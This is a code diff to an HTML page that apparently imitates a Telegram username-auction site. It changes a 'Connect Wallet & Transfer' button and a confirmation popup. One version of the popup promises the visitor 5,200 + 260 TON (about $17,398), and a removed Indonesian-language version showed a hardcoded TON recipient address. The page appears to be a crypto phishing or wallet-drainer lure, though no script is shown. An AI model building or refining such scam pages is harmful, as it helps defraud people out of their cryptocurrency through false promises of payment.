@@ -211,35 +211,10 @@
                     <div class="tm-section-countdown-end"></div>
                 </div>
                 <div class="tm-section-box tm-section-buttons">
-                    <button id="mainButton" class="btn btn-primary btn-block">
-                                    <span class="tm-button-label">Connect Wallet & Transfer </span>
-                                </button>
-                                <div id="statusMessage" class="status-message" style="display: none;"></div>
+                    <button class="btn btn-primary" id="mainButton">Connect Wallet & Transfer</button>
                 </div>
-        //------------------------
-        <div id="transferPopup" class="popup-container hide" data-close-outside="popup-body">
-    <div class="popup">
-        <div class="popup-body">
-            <section>
-                <button class="close-btn" id="popup-close-btn">&times;</button>
-                <h2>Konfirmasi Transfer</h2>
-                <p>Silakan tinjau detail transfer Anda sebelum terhubung ke dompet:</p>
-                
-                <div class="transfer-info">
-                    <p>Anda akan menerima <strong><span id="transferAmount">0.1</span> TON</strong>.</p>
-                    <p>Alamat tujuan: <br> <strong><span id="transferRecipient">0QD4uCCSKWqbVEeksIA_a2DLGftKWYpd-IO5TQIns6ZNP_-U</span></strong></p>
-                </div>
-                
-                <div class="form-main-button">
-                    <button id="connectTransferBtn" class="btn btn-primary btn-block">
-                        <span class="tm-button-label">Connect Wallet & Transfer</span>
-                    </button>
-                </div>
-            </section>
-            <div id="statusMessage" class="status-message" style="display: none;"></div>
-        </div>
-    </div>
-</div>
+        
+        
                 <div class="tm-section-subscribe tm-section-box js-subscribe">
                     <a class="btn-link subscribe-btn js-subscribe-btn">Subscribe to updates</a>
                     <a class="btn-link unsubscribe-btn js-unsubscribe-btn">Unsubscribe from updates</a>
@@ -299,34 +274,40 @@
                 </div>
             </div>
         </div>
-        <div class="popup-container hide form-popup-container place-bid-popup-container js-place-bid-popup" data-close-outside="popup-body">
-            <div class="popup">
-                <div class="popup-body">
-                    <section>
-                        <h2>@hill</h2>
-                        <p class="popup-text">Telegram username and hill.t.me</p>
-                        <form class="js-place-bid-form">
-                            <div class="form-group">
-                                <label for="bid_value">You will receive</label>
-                                 <div class="tm-section-box tm-section-buttons">
-                    <span class="form-control btn-kyc" style="text-align: center;">
-                        <span class="icon-before icon-ton tm-amount">5,200 </span>
-                        <h4>+</h4>
-                        <span class="icon-before icon-ton tm-amount">260</span>
-                    </span></div>
-                                <p class="help-block">Approximately &#036;<span class="js-bid_usd_value">17,398</span></p>
-                                <div class="tm-form-control-hint"></div>
-                            </div>
-                            <div class="form-main-button">
-                                <button type="submit" class="btn btn-primary btn-block">
-                                    <span class="tm-button-label">Place bid </span>
-                                </button>
-                            </div>
-                        </form>
-                    </section>
-                </div>
-            </div>
+        <div class="popup-container hide form-popup-container place-bid-popup-container js-place-bid-popup" id="transferPopup" data-close-outside="popup-body">
+    <div class="popup">
+        <div class="popup-body">
+            <section>
+                <button class="close-btn" id="popup-close-btn">&times;</button>
+                <h2>Confirmation Your Transaction</h2>
+                <p class="popup-text">Silakan tinjau detail transfer Anda.</p>
+                <form class="js-place-bid-form">
+                    <div class="form-group">
+                        <label for="bid_value">You will receive</label>
+                        <div class="tm-section-box tm-section-buttons">
+                            <span class="form-control btn-kyc" style="text-align: center;">
+                                <span class="icon-before icon-ton tm-amount">5,200</span>
+                                <h4>+</h4>
+                                <span class="icon-before icon-ton tm-amount">260</span>
+                            </span>
+                        </div>
+                        <p class="help-block">Approximately $<span class="js-bid_usd_value">17,398</span></p>
+                        <div class="tm-form-control-hint">
+                            <p><strong></strong></p>
+                            <p id="transferRecipient"></p>
+                        </div>
+                    </div>
+                    <div class="form-main-button">
+                        <button id="connectTransferBtn" class="btn btn-primary btn-block" type="button">
+                            <span class="tm-button-label">Continue</span>
+                        </button>
+                    </div>
+                </form>
+            </section>
+            <div id="statusMessage" class="status-message" style="display: none;"></div>
         </div>
+    </div>
+</div>
         <div class="popup-container hide form-popup-container js-put-to-auction-popup" data-close-outside="popup-body">
             <div class="popup">
                 <div class="popup-body">
